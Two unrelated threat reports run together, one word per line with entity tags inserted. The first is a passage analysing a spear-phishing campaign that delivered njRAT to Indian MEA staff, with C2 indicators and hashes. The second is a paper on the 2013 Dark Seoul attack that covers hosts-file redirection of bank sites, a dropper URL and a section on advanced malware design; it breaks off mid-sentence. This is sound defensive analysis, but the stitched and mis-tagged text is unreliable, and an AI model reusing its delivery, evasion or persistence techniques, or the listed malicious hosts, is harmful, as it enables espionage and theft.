as
if
an
investigation
report
related
to
Uri
terror
attack
was
shared
by
the
MHA
official
.

This
email
contained
a
malicious
word
document
(
Uri
Terror
Report.doc
)
as
shown
in
the
below
screen
shot

On
Sept
20th,2016
similar
Uri
Terror
report
themed
email
was
also
sent
to
an
email
id
connected
with
Indian
embassy
in
Thailand
.

This
email
was
later
forwarded
on
Oct
24th,2016
from
a
spoofed
email
id
which
is
associated
with
Thailand
Indian
embassy
to
various
email
recipients
connected
to
the
Indian
Ministry
of
External
Affairs
as
shown
in
the
below
screen
shot
.

This
email
also
contained
the
same
malicious
word
document
(
Uri
Terror
Report.doc
)

In
the
second
wave
of
attack
slightly
different
theme
was
used
,
this
time
attackers
used
the
Jammnu
&
Kashmir
protest
theme
to
target
the
victims
.

In
this
case
Attackers
again
spoofed
an
email
id
associated
with
Indian
Ministry
of
Home
Affairs
and
the
mail
was
sent
on
September
1,2016
to
an
email
id
associated
Thailand
Indian
embassy
,
this
email
was
later
forwarded
on
Oct
24th,2016
from
a
spoofed
email
of
Thailand
Indian
embassy
to
various
email
recipients
connected
to
the
Indian
Ministry
of
External
Affairs
(
MEA
)
.

This
time
the
email
was
made
to
look
like
an
investigation
report
related
to
Jammu
&
Kashmir
protest
was
shared
by
the
Ministry
of
Home
Affairs
Official
and
the
forwarded
email
was
made
to
look
like
the
report
was
forwarded
by
an
Ambassador
in
Thailand
Indian
embassy
to
the
MEA
officials
.

This
email
contained
a
different
malicious
word
document
(
mha-report.doc
)
as
shown
in
the
below
screen
shot
.

From
the
emails
(
and
the
attachments
)
it
looks
like
the
goal
of
the
attackers
was
to
infect
and
take
control
of
the
systems
and
also
to
spy
on
the
actions
of
the
Indian
Government
post
the
Jammu
&
Kashmir
protest
and
Uri
Terror
attack
.

Analysis
of
Malicious
Word
Documents

When
the
victim
opens
the
attached
word
document
it
prompts
the
user
to
enable
macro
content
and
both
the
documents
(
Uri
Terror
Report.doc
and
mha-report.doc
)
displayed
the
same
content
and
contained
a
Show
Document
button
as
shown
below

In
case
of
both
the
documents
(
Uri
Terror
Report.doc
and
mha-report.doc
)
the
malicious
macro
code
was
heavily
obfuscated
(
used
obscure
variable
/
function
names
to
make
analysis
harder
)
and
did
not
contain
any
auto
execute
functions
.

Malicious
activity
is
trigged
only
on
user
interaction
,
attackers
normally
use
this
technique
to
bypass
sandbox
/
automated
analysis
.

Reverse
engineering
both
the
word
documents
(
Uri
Terror
Report.doc
&
mhareport.doc
)
exhibited
similar
behaviour
except
the
minor
difference
mentioned
below
.

In
case
of
mha-report.doc
the
malicious
activity
triggered
only
when
the
show
document
button
was
clicked
,
when
this
event
occurs
the
macro
code
calls
a
subroutine
CommandButton1_Click()
which
in
turn
calls
a
malicious
obfuscated
function
(
Bulbaknopka()
)
as
shown
in
the
below
screen
shot
.

In
case
of
Uri
Terror
Report.doc
the
malicious
activity
triggered
when
the
document
was
either
closed
or
when
the
show
document
button
was
clicked
,
when
any
of
these
event
occurs
a
malicious
obfuscated
function
(
chugnnarabashkoim()
)
gets
called
as
shown
below
.


The
malicious
macro
code
first
decodes
a
string
which
contains
a
reference
to
the
pastebin
url
.

The
macro
then
decodes
a
PowerShell
script
which
downloads
base64
encoded
content
from
the
pastebin
url
.

Below
screen
shot
shows
the
network
traffic
generated
as
a
result
of
macro
code
executing
the
PowerShell
script
.

Below
screen
shot
shows
the
malicious
base64
encoded
content
hosted
on
that
pastebin
link
.


The
base64
encoded
content
downloaded
from
the
Pastebin
link
is
then
decoded
to
an
executable
and
dropped
on
the
system
.

The
technique
of
hosting
malicious
code
in
legitimate
sites
like
Pastebin
has
advantages
and
it
is
highly
unlikely
to
trigger
any
suspicion
in
security
monitoring
and
also
can
bypass
reputation
based
devices
.

Below
screen
shot
shows
the
file
(
officeupdate.exe
)
decoded
and
dropped
on
the
system
.

The
dropped
file
was
determined
as
modified
version
of
njRAT B_malware.backdoor
trojan
.

The
dropped
file
(
officeupdate.exe
)
is
then
executed
by
the
macro
code
using
the
PowerShell
script
.

njRAT B_malware.backdoor
is
a
Remote
Access
Tool
(
RAT
)
used
mostly
by
the
actor
groups
in
the
middle
east
.

Once
infected
njRAT B_malware.backdoor
communicates
to
the
attacker
and
allows
the
attacker
to
log
keystrokes
,
upload
/
download
files
,
access
victims
web
camera
,
audio
recording
,
steal
credentials
,
view
victims
desktop
,
open
reverse
shell
etc
.

The
njRAT B_malware.backdoor
attacker
control
panel
and
the
features
in
the
attacker
control
panel
is
shown
in
the
below
screen
shot
.

Analysis
of
the
Dropped
Executable
(
officeupdate.exe
)

The
dropped
file
was
analyzed
in
an
isolated
environment
(
without
actually
allowing
it
to
connect
to
the
c2
server
)
.

This
section
contains
the
behavioral
analysis
of
the
dropped
executable

Once
the
dropped
file
(
officeupdate.exe
)
is
executed
the
malware
drops
additional
files
(
googleupdate.exe
,
malib.dll
and
msccvs.dll
)
into
the
%AllUsersProfile%\Google
directory
and
then
executes
the
dropped
googleupdate.exe

The
malware
then
communicates
with
the
C2
server
(
khanji[.]ddns[.]net B_url.cncsvr
)
on
port
5555

C2
Communication
Pattern

Upon
execution
malware
makes
a
connection
to
the
c2
server
on
port
5555
and
sends
the
system
&
operating
system
information
along
with
some
base64
encoded
strings
to
the
attacker
as
shown
below
.

Below
is
the
description
of
the
strings
passed
in
the
C2
communication

WIN-T9UN4HIIHEC
->
is
the
hostname
of
the
infected
system

Administrator
->
is
the
username
16-12-04
->
is
the
infection
date

No
->
Indicates
that
the
system
has
no
camera

The
below
screen
shot
shows
the
base64
decoded
strings
associated
with
the
C2
communication

Below
is
the
description
of
the
decoded
strings
1302_E63C5C8F
->
is
the
botID_volume-serial-number

Process
Hacker
[WIN-T9UN4HIIHEC\Administrator]+
->
Reports
open
window
,
In
my
case
I
was
using
a
tool
called
Process
Hacker
,
The
information
on
the
open
window
lets
the
attacker
know
what
tools
are
running
on
the
system
or
if
analysis
tools
are
used
to
inspect
the
malware
.

C2
Domain
Information

This
section
contains
the
details
of
the
C2
domain
(
khanji[.]ddns[.]net B_url.cncsvr
)
.

Attackers
used
the
DynamicDNS
to
host
the
C2
server
,
this
allows
the
attacker
to
quickly
change
the
IP
address
in
real
time
if
the
malware
C2
server
infrastructure
is
unavailable
.

The
C2
domain
was
associated
with
multiple
IP
addresses
in
past
as
shown
below

During
the
timeline
of
this
cyber
attack
most
of
these
IP
addresses
were
located
in
Pakistan
and
few
IP
addresses
used
the
hosting
provider
infrastructure
as
shown
in
the
screen
shot
below

Below
screenshot
shows
the
timeline
when
these
IP
addresses
were
active
.

The
C2
domain
(
khanji[.]ddns[.]net B_url.cncsvr
)
was
also
found
to
be
associated
with
multiple
malware
samples
in
the
past
,
Some
of
these
malware
samples
made
connection
to
pastebin
urls
upon
execution
,
which
is
similar
to
the
behavior
mentioned
previously
.


Threat
Intelligence

Based
on
the
base64
encoded
content
posted
in
the
Pastebin
,
userid
associated
with
the
Pastebin
post
was
determined
.

The
same
user
posted
multiple
similar
posts
most
of
them
containing
similar
base64
encoded
content
(
probably
used
by
the
malwares
in
other
campaigns
to
decode
and
drop
malware
executable
)
,
these
posts
were
made
between
July
21st
,
2016
to
September
30
,
2016
.

Below
screen
shot
shows
the
posts
made
by
the
user
,
the
hits
column
in
the
below
screen
shot
gives
an
idea
of
number
of
times
the
links
were
visited
(
probably
by
the
malicious
macro
code
)
,
this
can
give
rough
idea
of
the
number
of
users
who
are
probably
infected
as
a
result
of
opening
the
malicious
document
.


Below
screen
shot
shows
one
of
the
post
containing
base64
encoded
data
made
by
the
user
on
Sept
26th,2016

Doing
a
Google
search
for
the
Pastebin
userid
landed
me
on
a
YouTube
video
posted
by
an
individual
demonstrating
his
modified
version
of
njRAT B_malware.backdoor
control
panel
/
builder
kit
.

The
Pastebin
userid
matched
with
the
Email

ID
mentioned
by
this
individual
in
the
YouTube
video
description
section
as
shown
below
.

This
individual
also
used
a
specific
keyword
in
his
Skype
id
,
Twitter
id
,
and
the
YouTube
username
.

This
same
keyword
was
also
found
in
the
njRAT B_malware.backdoor
C2
communication
used
in
this
attack
as
shown
below
.


After
inspecting
the
njRAT B_malware.backdoor
builder
kit
it
was
determined
that
this
individual
customized
the
existing
njRAT B_malware.backdoor
builder
kit
to
bypass
security
products
.

The
product
information
in
the
builder
kit
matched
with
this
individual's
YouTube
username
and
the
YouTube
channel
.

The
njRAT B_malware.backdoor
used
in
this
cyber
attack
was
built
from
this
builder
kit
.

Based
on
this
information
it
can
be
concluded
that
espionage
actors
used
this
individual's
modified
version
of
njRAT B_malware.backdoor
in
this
cyber
attack
.

Even
though
this
individual's
email
id
matched
with
the
Pastebin
id
where
base64
encoded
malicious
code
was
found
,
it
is
hard
to
say
if
this
individual
was
or
was
not
involved
in
this
cyber
attack
.

It
could
be
possible
that
the
espionage
actors
used
his
public
identity
as
a
diversion
to
mislead
and
to
hide
the
real
identity
of
the
attackers
or
it
is
also
possible
that
this
individual
was
hired
to
carry
out
the
attack
.

Indicators
Of
Compromise

The
indicators
are
provided
below
,
these
indicators
can
be
used
by
the
organizations
(
Government
,
Public
and
Private
organizations
)
to
detect
and
investigate
this
attack
campaign
.

Dropped
Malware
Samples
:
14b9d54f07f3facf1240c5ba89aa2410  B_hash
(
googleupdate.exe
)
2b0bd7e43c1f98f9db804011a54c11d6  B_hash
(
malib.dll
)
feec4b571756e8c015c884cb5441166b  B_hash
(
msccvs.dll
)
84d9d0524e14d9ab5f88bbce6d2d2582  B_hash
(
officeupdate.exe
)

Network
Indicators
Associated
with
C2
:
khanji[.]ddns[.]net B_url.cncsvr
139[.]190[.]6[.]180 B_ip.cncsvr
39[.]40[.]141[.]25  B_ip.cncsvr
175[.]110[.]165[.]110 B_ip.cncsvr
39[.]40[.]44[.]245  B_ip.cncsvr
39[.]40[.]67[.]219  B_ip.cncsvr
119[.]160[.]68[.]178  B_ip.cncsvr
175[.]107[.]13[.]215  B_ip.cncsvr
39[.]47[.]125[.]110 B_ip.cncsvr
175[.]107[.]5[.]247 B_ip.cncsvr
175[.]107[.]6[.]174 B_ip.cncsvr
182[.]191[.]90[.]91 B_ip.cncsvr
175[.]107[.]7[.]50  B_ip.cncsvr
182[.]191[.]90[.]92 B_ip.cncsvr
175[.]107[.]7[.]69  B_ip.cncsvr
39[.]47[.]84[.]127  B_ip.cncsvr
192[.]169[.]136[.]121 B_ip.cncsvr
155[.]254[.]225[.]24  B_ip.cncsvr
203[.]31[.]216[.]214  B_ip.cncsvr
45[.]42[.]243[.]20  B_ip.cncsvr

Pastebin
URL's
Hosting
Malicious
Payload
:
hxxp://pastebin.com/raw/5j4hc8gT  B_url.unknown
hxxp://pastebin.com/raw/6bwniBtB  B_url.unknown

Related
Malware
Samples
associated
with
C2
(
khanji[.]ddns[.]net B_url.cncsvr
)
:
028caf3b1f5174ae092ecf435c1fccc2  B_hash
7732d5349a0cfa1c3e4bcfa0c06949e4  B_hash
9909f8558209449348a817f297429a48  B_hash
63698ddbdff5be7d5a7ba7f31d0d592c  B_hash
7c4e60685203b229a41ae65eba1a0e10  B_hash
e2112439121f8ba9164668f54ca1c6af  B_hash
784b6e13f195236304e1c172dcdab51f  B_hash
b0f0350a5c2480d8419d14ec3445b765  B_hash
9a51db9889d4fd6d02bdb35bd13fb07e  B_hash
8199667bad5559ee8f04fd6b1a587a75  B_hash
7ad6aaa107a7616a3dbe8e3babf5d310  B_hash

Conclusion

Attackers
in
this
case
made
every
attempt
to
launch
a
clever
attack
campaign
by
spoofing
legitimate
email
ids
and
using
an
email
theme
relevant
to
the
targets
.

The
following
factors
in
this
cyber
attack
suggests
the
possible
involvement
of
Pakistan
state
sponsored
cyber
espionage
group
to
mainly
spy
on
India's
actions
related
to
these
Geo-political
events
(
Uri
terror
attack
and
Jammu
&
Kashmir
protests
)
.

Victims
/
targets
chosen
(
Indian
Embassy
and
Indian
MEA
officals
)

Use
of
Email
theme
related
to
the
Geo-political
events
that
is
of
interest
to
the
targets

Timing
of
the
spear B_malware.infosteal
phishing  I
emails
sent
to
the
victims

Location
of
the
C2
infrastructure

Use
of
malware
that
is
capable
of
spying
on
infected
systems


The
following
factors
show
the
level
of
sophistication
and
reveals
the
attackers
intention
to
remain
stealthy
and
to
gain
long-term
access
by
evading
anti-virus
,
sandbox
and
security
monitoring
at
both
the
desktop
and
network
levels
.

Use
of
obfuscated
malicious
macro
code

Use
of
macro
code
that
triggers
only
on
user
intervention
(
to
bypass
sandbox
analysis
)

Use
of
legitimate
site
(
Pastebin
)
to
host
malicious
code
(
to
bypass
security
monitoring
)

Use
of
customized
njRAT B_malware.backdoor
(
capable
of
evading
anti-virus
)

Use
of
Dynamic
DNS
to
host
C2
infrastructure

I
would
like
to
thank
Brian
Rogalski
who
after
reading
my
previous
blog
post
shared
a
malicious
document
which
he
thought
was
similar
to
the
document
mentioned
in
my
previous
blog
.

This
malicious
document
shared
by
Brian
triggered
this
investigation
and
helped
me
in
identifying
the
related
Emails
and
related
documents
associated
with
this
cyber
attack
.

References
https://www.zscaler.com/blogs/research/njrat-h-worm-variant-infections-continue-rise  B_url.normal
http://threatgeek.typepad.com/files/fta-1009—njrat-uncovered-1.pdf  B_url.normal
https://www.eff.org/files/2013/12/28/quantum_of_surveillance4d.pdf  B_url.normal
https://www.symantec.com/connect/blogs/simple-njrat-fuels-nascent-middle-east-cybercrime-scene  B_url.normal

Follow
us
on
Twitter
:
@monnappa22
@cysinfo22
CISAK
2013
–
C1/O/8

Dark
Seoul
Cyber
Attack
:
Could
it
be
worse
?

Jonathan
A
.
P
.
Marpaung
1
,
HoonJae
Lee
1
1
Cryptography
&
Network
Security
Lab
,
Dongseo
University
San
69-1
,
Jurye
2-dong
,
Sasang-gu
,
Busan
617-716
,
Korea
1
jonathan@spentera.com
1
hjlee@dongseo.ac.kr

Abstract
.

On
March
20
,
2013
a
cyber
attack
now
known
as
Dark
Seoul
,
paralyzed
several
major
banking
services
and
broadcasters
in
South
Korea
.

Labeled
by
the
media
as
cyber
terror
,
the
attack
significantly
disrupted
these
services
for
at
least
one
day
.

Despite
these
facts
,
various
indicators
suggest
that
the
attack
had
a
low
level
of
sophistication
.

Major
cyber
attacks
in
the
past
such
as
Ten
Days
of
Rain
and
the
SK
Communications
breach
employed
far
more
advanced
techniques
compared
to
Dark
Seoul
.

We
examine
the
technical
details
of
Dark
Seoul
by
outlining
the
primary
attack
vector
used
,
describing
the
malware
components
,
and
discussing
the
malware's
evasion
techniques
.

Furthermore
we
compare
this
incident
to
previous
attacks
in
order
to
determine
its
technical
sophistication
using
these
attacks
as
a
relative
benchmark
.

Lastly
we
explore
various
malware
design
techniques
that
were
not
used
in
the
malware
such
as
multiple
propagation
vectors
,
0-day
exploits
,
and
evasion
techniques
,
thus
presenting
a
proof
of
concept
of
the
malware's
low
technical
sophistication
.

Keywords
:
advanced
persistent
threat
;
cyber
attack
;
Dark
Seoul
;
defense
;
malware
analysis
;

A
.
INTRODUCTION
to
analyze

On
March
20
,
2013
,
at
approximately
14.15PM
South
Korea
suffered
a
cyber
attack
that
resulted
in
the
denial
of
service
of
several
major
banks
and
broadcasters
.

Reported
as
a
major
cyber
attack
,
our
analysis
of
the
malware
and
attack
vectors
employed
suggests
that
the
malware
had
a
relatively
low
level
of
technical
sophistication
.

Firstly
we
explore
the
technical
components
of
Dark
Seoul
sophistication
of
the
malware
and
attack
vectors
used
.

This
analysis
is
based
on
information
obtained
from
the
media
as
well
as
technical
reports
of
various
malware
research
labs
such
as
AhnLab
,
Imperva
,
Symantec
,
Avast
,
Kaspersky
,
Alienvault
,
and
Sophos
.

Secondly
we
conduct
a
comparative
study
of
Dark
Seoul
by
looking
at
prior
cyber
attacks
,
namely
Stuxnet B_malware.backdoor
,
10
Days
of
Rain
,
and
the
SK
Communications
breach
.

By
doing
so
we
draw
a
picture
of
South
Korea's
current
security
posture
since
those
attacks
.

Lastly
we
discuss
several
design
characteristics
of
advanced
malware
used
by
determined
adversaries
to
carry
out
more
technically
advanced
and
stealthier
attacks
,
therefore
highlighting
the
components
where
Dark
Seoul
lacked
sophistication
.

B
.
POSTMORTEM

Television
broadcasters
YTN
,
MBC
,
and
banks
KBS
,
Shinhan
,
Nonghyup
,
and
Jeju
were
targeted
in
this
recent
attack
.

The
Korea
Internet
Security
Agency
(
KISA
)
reported
that
about
48,000
computers
were
affected
making
services
inaccessible
and
the
victim
organizations
needed
weeks
to
fully
restore
all
functions
[
1
]
.

In
terms
of
impact
,
the
attackers
managed
to
successfully
penetrate
the
target
networks
,
pivot
their
way
into
critical
assets
,
wipe
out
systems
,
cause
denial
of
services
,
and
trigger
enough
public
response
to
spur
the
media
into
using
terminology
such
as
cyber
terror
and
advanced
persistent
threats
.

In
this
paper
we
take
an
in-depth
look
of
the
malware
by
examining
the
attack
vectors
used
,
and
later
discuss
whether
the
claims
in
the
media
are
warranted
.

According
to
the
investigating
team
consisting
of
government
,
military
,
and
civilian
members
,
as
many
as
76
samples
of
malware
were
collected
from
infected
machines
[
2
]
.

We
present
the
most
likely
primary
attack
vector
used
by
the
attackers
by
discussing
information
summarized
from
reports
by
Avast
[
3
]
,
Trend
Micro
[
4
]
,
and
Symantec
[
5
]
[
6
]
issued
in
the
first
few
days
following
the
attack
.

Fig
.
1
.
Dark
Seoul
Attack
Vector

1
.
Spearphishing B_malware.infosteal

Trend
Micro
researchers
discovered
a
phishing
email
sent
to
South
Korean
organizations
on
March
19
.

The
email
contained
a
malicious
Trojan
downloader
which
the
researchers
report
to
have
been
detected
by
their
Deep
Discovery
software
.

This
is
likely
to
be
the
initial
attack
point
.

CISAK
2013
–
C1/O/8
2
.
Launch
Platform
–
Cross-Site
Scripting
(
SPC
)

Property

Right-Council

Avast
detected
the
attacks
originating
from
the
Korea
Software
website
(
http://www.spc.or.kr  B_url.normal
)
possibly
infected
via
the
phishing
email
sent
on
the
19th
.

Usage
of
a
legitimate
website
/
server
in
the
target
nation
/
region
for
launching
attacks
is
a
common
tactic
used
to
minimize
detection
.

The
SPC
website
contained
JavaScript
causing
the
client
browser
to
load
an
iframe
loading
the
contents
of
http://rootadmin2012.com  B_url.unknown
,
which
was
the
main
attack
site
for
hosting
the
malicious
payloads
.

3
.
Exploitation

Examination
of
rootadmin2012.com B_url.unknown
revealed
heapspray
and
shellcodes
with
references
to
Internet
Explorer
(
IE
)
.

Avast
managed
to
identify
the
vulnerability
exploited
as
CVE-2012-1889 B_malware.backdoor
[
7
]
which
allows
remote
attackers
to
execute
arbitrary
code
or
cause
a
denial
of
service
via
a
crafted
website
.

The
vulnerability
targets
Microsoft
XML
Core
Services
3.0
–
6.0
with
a
published
metasploit
exploit
targeting
MS
XML
Core
Services
3.0
via
IE6
and
IE7
over
Windows
XP
[
8
]
.

After
gaining
access
the
second
stage
downloader
file
(
sun.exe
)
performs
the
following
actions
:
a
.
Check
for
internet
connection
:
Downloads
an
image
from
naver.com B_url.normal
.

b
.
Local
DNS
cache
poisoning
:
Redirects
requests
to
certain
Korean
banking
websites
listed
in
Figure
2
to
another
server
in
Japan
.

126.114.224.53  B_ip.unknown
www.kbstar.com  B_url.normal
126.114.224.53  B_ip.unknown
www.ibk.co.kr B_url.normal
126.114.224.53  B_ip.unknown
www.shinhan.com B_url.normal
126.114.224.53  B_ip.unknown
www.wooribank.com B_url.normal
126.114.224.53  B_ip.unknown
www.hanabank.com  B_url.normal
126.114.224.53  B_ip.unknown
www.nonghyup.com  B_url.normal

Fig
.
2
.
New
entries
appended
to
Windows
hosts
file
c
.

Update
download
counter
:
Runs
a
counter
script
by
opening
http://myadmin2012.com/tong.htm B_url.unknown
.

d
.
Makes
itself
persistent
:
Modifies
the
Windows
registry
by
adding
value
with
name
'
skunser
'
and
data
'
C:\ntldrs\svchest.exe
'
,
where
it
was
previously
copied
to
.

e
.
Download
backdoor
:
Downloads
dropper
file
http://www.hisunpharm.com/  B_url.distribute
pao.exe B_malware.drop
files/File/product/
and
stores
it
to
C:\ProgramFiles\tongji2.exe B_malware.backdoor
from
f
.
Drops
and
execute
batch
file
:
schedules
downloader
every
30
minutes
and
ensures
svchest.exe
started
with
Local
System
privileges
.

4
.
Post-exploitation

The
tongji2.exe B_malware.backdoor
module
injects
itself
into
iexplore.exe
in
an
attempt
to
mask
itself
.

Avast
classified
this
as
a
backdoor
Trojan
and
infostealer
.

This
malware
allowed
attackers
to
control
the
computer
as
a
compromised
zombie
part
of
a
wider
botnet
network
–
a
theory
suggested
by
Alienvault
[
9
]
–
which
then
wiped
hard
disks
,
and
harvested
personal
information
.

Examination
of
the
file
names
and
the
Safeengine
executable
protector
suggest
that
the
malware
was
made
in
China
.

Although
capable
of
executing
many
functions
,
only
the
following
were
widely
utilized
in
the
attack
:
a
.
Antivirus
disablement
:
Malware
attempts
to
disable
Ahnlab
and
Hauri
antivirus
.

b
.
Command
&
control
(
C&C
)
:
Using
a
simple
XOR
loop
for
encryption
,
the
malware
attempts
to
connect
to
laoding521.eicp.net B_url.cncsvr
over
port
889
to
communicate
with
the
attackers
.

c
.
Harddisk
wiper
:
Symantec
identified
Trojan.Jokra  B_malware.unknown
as
the
malware
component
that
wiped
harddisks
in
the
attack
.

It
is
likely
that
it
was
downloaded
onto
the
victim's
computer
after
receiving
an
instruction
by
the
C&C
servers
.

The
malware
overwrites
the
master
boot
record
(
MBR
)
and
the
rest
of
the
harddisk
with
the
strings
'
PRINCIPES
'
or
'
HASTATI
.
'
.
Other
attached
drives
or
removable
devices
may
also
be
targeted
.

The
malware
then
forces
the
computer
to
restart
thus
making
it
unusable
.

An
interesting
feature
of
this
malware
is
that
it
has
components
to
wipe
out
harddisks
on
both
Windows
and
Linux
platforms
.

Detailed
analysis
of
Jokra B_malware.unknown
can
be
found
here
[
10
]
.

Information
harvesting
:
After
gaining
root
privileges
the
attackers
can
intercept
any
information
that
goes
in
or
out
of
the
infected
computer
.

However
the
most
apparent
information
taken
was
user
credentials
.

As
a
result
of
DNS
poisoning
,
users
believe
they
are
accessing
the
authentic
internet
banking
website
,
but
are
decepted
into
interacting
with
a
fake
website
.

An
error
message
pops
up
stating
that
the
user's
computer
was
infected
by
a
virus
and
that
for
security
reasons
they
need
to
apply
for
a
fraud
prevention
service
.

If
the
user
clicks
the
OK
button
,
the
user
is
directed
to
a
page
requesting
their
name
and
national
identification
number
.

If
the
format
entered
is
correct
,
the
user
is
then
asked
to
fill
in
more
details
including
address
,
phone
number
,
etc
..

C
.
CASE
STUDIES
:
PREVIOUS
MAJOR
CYBER

ATTACKS
1
.
Stuxnet B_malware.backdoor

Stuxnet B_malware.backdoor
was
discovered
in
July
2010
,
but
the
earliest
known
variant
is
confirmed
to
have
existed
since
2007
[
11
]
.

Stuxnet B_malware.backdoor
caught
many
security
researchers
and
professionals
by
surprise
,
being
the
first
advanced
malware
of
its
kind
.

According
to
Symantec's
report
[
12
]
,
Stuxnet B_malware.backdoor
is
a
complex
threat
that
was
primarily
written
to
target
an
industrial
control
system
(
ICS
)
or
set
of
similar
systems
.

A
vast
array
of
components
was
implemented
in
the
malware
including
four
0-Day
exploits
,
a
windows
rootkit
,
antivirus
evasion
techniques
,
complex
process
injection
and
hooking
code
,
CISAK
2013
–
C1/O/8
network
infection
routinesr
,
peer-to-peer
updates
,
a
command
and
control
interface
,
as
well
as
the
first
ever
PLC
rootkit
.

Stuxnet's
main
payload
has
the
main
purpose
of
modifying
code
on
Siemens
industrial
PLCs
in
order
to
sabotage
the
system
.

It
is
widely
believed
that
Iran's
Natanz
nuclear
Fuel
Enrichment
Plant
(
FEP
)
was
the
intended
target
.

Hosts
in
five
domains
of
organizations
based
in
Iran
were
heavily
infected
over
3
attack
waves
.

The
deliberate
containment
of
the
malware
to
targets
in
Iran
is
also
apparent
from
the
number
of
hosts
infected
worldwide
,
which
reached
only
around
100,000
with
approximately
60%
being
in
Iran
.

This
attack
has
been
claimed
to
setback
Iran's
nuclear
program
by
several
years
as
1,000
out
of
9,000
centrifuges
were
disabled
and
had
to
be
replaced
[
13
]
.

The
initial
attack
point
is
likely
to
be
via
a
USB
infection
.

2
.
10
days
of
Rain

On
March
4
,
2011
,
exactly
20
months
after
a
similar
incident
during
the
U.S.
Independence
Day
celebrations
of
2009
,
a
botnet
based
in
South
Korea
launched
DDoS
attacks
against
40
websites
affiliated
with
South
Korean
government
,
military
,
and
civilian
critical
infrastructure
as
well
as
U.S.
forces
based
in
Korea
[
14
]
.

The
botnet
was
dynamically
updated
via
new
malware
binaries
,
launched
a
DDoS
non-stop
for
more
than
a
week
,
and
then
wiped
the
harddisks
with
zeroes
,
overwriting
the
MBR
making
the
machines
unusable
.

This
attack
used
malware
with
a
much
higher
level
of
sophistication
than
is
necessary
to
launch
a
trivial
distributed
denial
of
service
(
DDoS
)
attack
.

Encryption
of
code
and
configurations
using
cipher
algorithms
such
as
the
Advanced
Encryption
Standard
(
AES
)
,
RSA
,
and
Rivest
Cipher
4
(
RC4
)
enabled
them
to
evade
detection
and
prolong
analysis
.

A
multitier
botnet
architecture
included
40
C&C
servers
distributed
across
the
globe
including
servers
in
the
USA
,
Taiwan
,
Saudi
Arabia
,
Russia
,
and
India
.

Highlighting
the
overkill
in
this
attack
,
McAfee
went
so
far
as
to
call
it
'
analogous
to
bringing
a
Lamborghini
to
a
go-cart
race
'
[
15
]
.

Considering
the
limited
timeframe
scope
and
target
list
,
McAfee
suggested
the
motivation
of
the
attack
was
a
cyber
war
exercise
to
test
the
preparedness
of
South
Korea's
cyber
defense
capabilities
and
to
better
understand
the
technical
requirements
for
a
successful
campaign
.

3
.
SK
Communications
–
CyWorld

In
July
2011
SK
Communications
became
the
victim
of
an
attack
that
resulted
in
the
loss
of
the
personal
details
of
35
million
users
[
16
]
.

The
users
of
CyWorld
and
Nate
,
services
owned
by
SK
Communications
,
were
affected
by
this
attack
.

Judging
from
the
sophistication
of
the
attack
and
the
time
needed
for
planning
it
,
researchers
concluded
that
the
attack
was
likely
to
be
carried
out
by
an
Advanced
Persistent
Threat
.

Between
July
,
18
and
25
,
more
than
60
computers
were
infected
then
used
to
gain
access
to
the
user
databases
.

The
launch
point
was
a
South
Korean
software
company's
update
server
,
normally
used
to
deliver
software
updates
to
customers
[
17
]
.

The
attackers
compromised
the
server
and
created
a
Trojan
that
would
be
downloaded
to
user
computers
during
a
routine
update
.

Poor
change
management
policy
resulted
in
the
full
trust
of
software
updates
,
allowing
attackers
to
fully
exploit
this
weakpoint
.

During
this
time
attackers
used
C&C
servers
to
monitor
the
activities
on
the
infected
machines
and
uploaded
tools
on
a
previously
compromised
legitimate
Taiwanese
website
.

An
elaborate
infrastructure
of
waypoints
and
C&C
servers
was
created
to
make
tracing
the
sources
of
their
activities
difficult
.

In-depth
investigation
of
the
attack
reveal
that
preparation
went
back
as
early
as
September
2010
before
finally
culminating
in
the
compromise
of
the
user
databases
between
July
26-28
,
2011
.

Comparing
Dark
Seoul
with
previous
attacks
shows
that
it
was
technically
low
in
sophistication
while
causing
high
impact
to
the
organizations
affected
.

An
intuitive
indicator
of
this
sophistication
is
that
it
was
completely
preventable
if
the
organizations
had
used
existing
software
updates
and
antivirus
solutions
,
whereas
prior
attacks
could
not
have
been
detected
.

However
judging
from
the
high
number
of
infections
,
services
disrupted
,
and
the
fact
that
information
was
being
harvested
from
the
infected
machines
at
least
8
months
[
18
]
before
the
dday
wipeout
,
we
consider
the
impact
to
be
high
.

Table
1
.
Comparison
with
Previous
Attacks
.

Metric

Stuxnet B_malware.backdoor
(
20072010
)

VERY

HIGH

VERY

HIGH
>100,000

Nuclear

Program
>3
years

SK
Comm
(
2011
)

HIGH

HIGH
35
million
users
months
10
days
of
rain
(
2011
)

VERY

HIGH

HIGH
>100,000
8
billion
>1
year

Dark

Seoul
(
2013
)

HIGH
>48,000

DDoS
>8
months

Sophistication

Impact
#of
Infections

Losses

Time
Before

Detection

D
.
ADVANCED
MALWARE
DESIGN

1
.
Multiple
Propagation
Vectors

To
increase
the
probability
of
successfully
infecting
the
target
systems
,
various
propagation
vectors
should
be
embedded
into
the
malware
.

The
most
likely
attack
vector
is
social
engineering
via
phishing
emails
,
USB
sticks
,
and
other
techniques
.

Although
people
can
be
used
as
the
initial
point
of
entry
,
propagation
needs
to
continue
laterally
through
the
network
till
the
specific
target
host
is
reached
.

During
this
process
the
malware
may
need
higher
privileges
(
e.g.
root
)
and
further
exploits
will
be
utilized
.

Therefore
the
persistent
adversary
will
need
to
consider
multiple
vectors
to
infiltrate
target
systems
.

CISAK
2013
–
C1/O/8
2
.
0-day
Exploits

The
problem
with
publicly
published
vulnerabilities
is
people
can
defend
against
them
.

0-day
exploits
are
written
to
exploit
vulnerabilities
that
have
not
been
disclosed
to
the
public
nor
the
concerned
software
vendor
.

These
exploits
are
at
the
core
payload
of
any
advanced
malware
,
and
are
virtually
unstoppable
until
vendors
release
a
patch
or
anti-virus
providers
come
up
with
a
signature
definition
.

The
only
other
method
of
minimizing
the
0-day
threat
is
by
actively
designing
security
into
software
.

Dark
Seoul
did
not
use
any
0-days
.

3
.
Evasion
Techniques

The
deployment
of
anti-virus
software
,
intrusion
detection
systems
,
firewalls
and
other
malware
detection
or
prevention
technology
has
done
much
to
defend
against
many
attacks
.

Advanced
malware
bypasses
these
defenses
by
employing
techniques
such
as
dynamic
botnet
obfuscation
,
network
based
fragmentation
and
session
splicing
,
application
or
protocol
violations
,
disabling
intrusion
detection
systems
(
IDSs
)
,
to
more
advanced
techniques
such
as
encryption
and
code
reuse
attacks
[
19
]
.

Carefully
crafted
exploits
can
avoid
even
advanced
heuristic
detection
algorithms
used
in
today's
antivirus
software
.

Evasion
techniques
are
crucial
for
successful
attacks
against
high
level
targets
,
such
as
in
the
case
of
the
Iranian
nuclear
program
.

E
.
CONCLUSION

Dark
Seoul
was
a
